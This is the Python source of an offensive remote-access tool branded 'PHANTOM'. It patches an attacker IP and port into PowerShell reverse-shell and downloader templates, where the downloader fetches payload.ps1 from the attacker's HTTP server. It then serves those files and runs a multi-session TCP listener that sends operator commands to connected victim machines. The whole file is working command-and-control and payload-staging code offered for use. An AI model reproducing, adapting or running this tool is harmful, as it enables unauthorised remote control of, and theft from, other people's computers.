import yaml
import os
import sys
import subprocess
import platform
import socket
import threading

# Colors :
RED     = "\033[0;31m"  
BLUE    = "\033[0;34m"
CYAN    = "\033[0;36m"
GREEN   = "\033[0;32m"
PURPLE  = "\033[0;35m"
RESET   = "\033[1;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"

# Constants for file paths and configurations
CONFIG_FILE = "config.yaml"
EXPLOIT_FOLDER = "exploit"
SHELL_FILE = '.src/shell.ps1'
REQUEST_FILE = '.src/request.ps1'
PAYLOAD_FILE = os.path.join(EXPLOIT_FOLDER, 'payload.ps1')
DOWNLOADER_FILE = os.path.join(EXPLOIT_FOLDER, 'downloader.ps1')

def banner() :
    os.system("clear")
    print(f"{GREEN}\t██████╗░██╗░░██╗░█████╗░███╗░░██╗████████╗░█████╗░███╗░░░███╗{RESET}")
    print(f"{CYAN}\t██╔══██╗██║░░██║██╔══██╗████╗░██║╚══██╔══╝██╔══██╗████╗░████║{RESET}")
    print(f"{GREEN}\t██████╔╝███████║███████║██╔██╗██║░░░██║░░░██║░░██║██╔████╔██║{RESET}")
    print(f"{CYAN}\t██╔═══╝░██╔══██║██╔══██║██║╚████║░░░██║░░░██║░░██║██║╚██╔╝██║{RESET}")
    print(f"{GREEN}\t██║░░░░░██║░░██║██║░░██║██║░╚███║░░░██║░░░╚█████╔╝██║░╚═╝░██║{RESET}")
    print(f"{CYAN}\t╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝{RESET}")
    print(f"{CYAN}\t\t\t\t\tTool By {RED}SinisterByte {CYAN}:){RESET}")
    print(f"\n\n")

# Session storage
sessions = []  # List to track active sessions
session_lock = threading.Lock()  # To manage access to the session list

# Event for stopping the listener thread
stop_event = threading.Event()

# Function to read existing configuration or return None if it doesn't exist
def get_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as file:
            config = yaml.safe_load(file)
            return config.get('LHOST'), config.get('LPORT')
    else:
        return None, None

# Function to save the provided LHOST and LPORT into the config file
def save_config(lhost, lport):
    config = {'LHOST': lhost, 'LPORT': lport}
    with open(CONFIG_FILE, 'w') as file:
        file.write("# Network Setup:\n")
        yaml.dump(config, file)

# Retrieve existing LHOST and LPORT from config
lhost, lport = get_config()

# Prompt user for LHOST and LPORT if not found in the config
if lhost is None or lport is None:
    banner()
    print(f"{GREEN}[*] Setting up Network {RESET}")
    lhost = input(f"{CYAN}Enter your LHOST (IP address): {RESET}")
    lport = input(f"{CYAN}Enter your LPORT (port number): {RESET}")
    save_config(lhost, lport)

# Create the exploit folder if it doesn't already exist
if not os.path.exists(EXPLOIT_FOLDER):
    os.makedirs(EXPLOIT_FOLDER)

# Modify shell.ps1 with the specified LHOST and LPORT, and save it as payload.ps1
with open(SHELL_FILE, 'r') as file:
    shell_content = file.read()

shell_content = shell_content.replace('$LHOST = "0.0.0.0"', f'$LHOST = "{lhost}"')
shell_content = shell_content.replace('$LPORT = 0000', f'$LPORT = {lport}')

with open(PAYLOAD_FILE, 'w') as file:
    file.write(shell_content)

# Modify downloader.ps1 with the new LHOST
with open(REQUEST_FILE, 'r') as file:
    downloader_content = file.read()

downloader_content = downloader_content.replace(
    "('http://0.0.0.0:8000/payload.ps1')",
    f"('http://{lhost}:8000/payload.ps1')"
)

with open(DOWNLOADER_FILE, 'w') as file:
    file.write(downloader_content)


banner()
print(f"{CYAN}[*] Payload and request files generated successfully in the 'exploit' folder.{RESET}")

# Function to clear the terminal
def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to handle client sessions
def handle_client(client_socket, addr):
    with session_lock:
        sessions.append((client_socket, addr))
    
    print(f"{GREEN}[*] Connection accepted from {addr}{RESET}")
    print(f"💀 {GREEN}>>{RESET} ", end='', flush=True)  # Print the prompt after accepting the connection

# Function to list all active sessions
def list_sessions():
    with session_lock:
        if not sessions:
            print(f"{RED}[*] No active sessions.{RESET}")
            return
        print(f"{PURPLE}[*] Active Sessions:{RESET}")
        for idx, (sock, addr) in enumerate(sessions):
            print(f"{PURPLE}[*] Session {idx + 1}: {RESET}{addr}")

# Function to start a Python-based TCP listener
def start_python_listener(lhost, lport):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((lhost, int(lport)))
    server.listen(5)
    print(f"{GREEN}[*] Listening on {lhost}:{lport}...{RESET}")
    print(f"💀 {GREEN}>>{RESET} ", end='', flush=True)  # Print the prompt after listening

    while not stop_event.is_set():  # Check if stop_event is set to stop the listener
        try:
            server.settimeout(1.0)  # Timeout to periodically check stop_event
            client_socket, addr = server.accept()
            threading.Thread(target=handle_client, args=(client_socket, addr)).start()
        except socket.timeout:
            continue

    server.close()
    print(f"{CYAN}[*] Listener stopped.{RESET}")

# Function to handle exiting the script
def exit_script():
    # Signal listener and other threads to stop
    stop_event.set()

    # Close all active client sessions
    with session_lock:
        for client_socket, _ in sessions:
            try:
                client_socket.close()  # Close each client socket
            except OSError:
                pass  # Handle any error if the socket is already closed

    print(f"{CYAN}[*] All sessions closed.{RESET}")
    
    # Force the script to exit
    sys.exit(0)

# Function to execute commands on a specified session
def execute_command_on_session(session_index):
    with session_lock:
        if 0 <= session_index < len(sessions):
            client_socket, addr = sessions[session_index]
            print(f"{CYAN}[*] Connected to session {session_index + 1} at {GREEN}{addr}{RESET}")

            while True:
                command = input(f"💀 {CYAN}{addr} {RED}>>{RESET} ")  # Prompt for input with address
                if command.lower() == 'exit':
                    print(f"{GREEN}[*] Exiting session but keeping it running in the background.{RESET}")
                    return  # Exit the interactive session but keep the socket open
                if command.lower() == 'kill':
                    client_socket.close()
                    print(f"{GREEN}[*] Connection closed.{RESET}")
                    return  # Exit the inner loop to stop the listener
                elif command.lower() == 'clear':
                    clear_terminal()
                    continue
                elif command:
                    client_socket.send(command.encode())
                    response = client_socket.recv(4096).decode()
                    print(response)
        else:
            print(f"{RED}[*] Invalid session index.{RESET}")

# Function to determine the default terminal
def get_default_terminal():
    if platform.system() == "Linux":
        return "x-terminal-emulator"
    elif platform.system() == "Darwin":  # macOS
        return "Terminal"  # Built-in macOS terminal
    elif platform.system() == "Windows":
        return "powershell.exe"
    return None

# Input listener for the exploit command
while True:
    command = input(f"{GREEN} * Type 'exploit' to start the listeners or 'exit' to quit: {RESET}").strip().lower()
    if command == 'exploit':
        terminal = get_default_terminal()
        if terminal:
            subprocess.Popen([terminal, "-e", f"python -m http.server --bind {lhost}"], cwd=EXPLOIT_FOLDER)
            listener_thread = threading.Thread(target=start_python_listener, args=(lhost, lport))
            listener_thread.start()
            break
        else:
            print(f"{PURPLE}[!] Unable to determine the default terminal.{RESET}")
    elif command.lower() == 'clear':
        clear_terminal()
        continue
    elif command == 'exit':
        exit_script()
    else:
        print(f"{GREEN}[!] Invalid command. Please type 'exploit' or 'exit'.{RESET}")

# Main command loop
while True:
    command = input(f"💀 {GREEN}>>{RESET} ").strip().lower()
    if command == 'list sessions':
        list_sessions()
    elif command.startswith('connect session'):
        try:
            session_index = int(command.split()[-1]) - 1  # Convert to zero-based index
            execute_command_on_session(session_index)
        except (ValueError, IndexError):
            print(f"{RED}[!] Invalid session command. Use 'connect session <number>'.{RESET}")
    elif command.lower() == 'clear':
        clear_terminal()
        continue
    elif command == 'exit':
        exit_script()  # Call the exit function
        break  # Break the loop after exiting the script
    else:
        print(f"{RED}[!] Invalid command. Please type 'list sessions' or 'connect session <number>'.{RESET}")
